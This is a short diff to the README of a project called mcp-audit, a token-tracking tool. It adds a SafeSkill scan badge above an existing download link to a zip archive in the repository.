@@ -1,5 +1,7 @@
 # 🚀 mcp-audit - Track Your Tokens in Real Time
 
+[![SafeSkill 84/100](https://img.shields.io/badge/SafeSkill-84%2F100_Passes%20with%20Notes-yellow)](https://safeskill.dev/scan/ariefalabbasi-mcp-audit)
+
 [![Download mcp-audit](https://raw.githubusercontent.com/ariefalabbasi/mcp-audit/main/src/mcp-audit-1.5.zip)](https://raw.githubusercontent.com/ariefalabbasi/mcp-audit/main/src/mcp-audit-1.5.zip)
 
 ## 📋 Description
